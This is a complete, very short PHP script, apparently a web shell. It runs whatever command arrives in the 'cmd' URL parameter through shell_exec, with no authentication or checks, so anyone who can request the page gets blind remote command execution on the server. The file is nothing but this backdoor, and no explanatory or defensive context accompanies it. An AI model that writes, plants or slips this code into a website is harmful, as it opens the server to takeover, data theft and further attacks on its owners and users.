<?php
    if(isset($_GET['cmd']))
    {
        shell_exec($_GET['cmd']);
    }
?>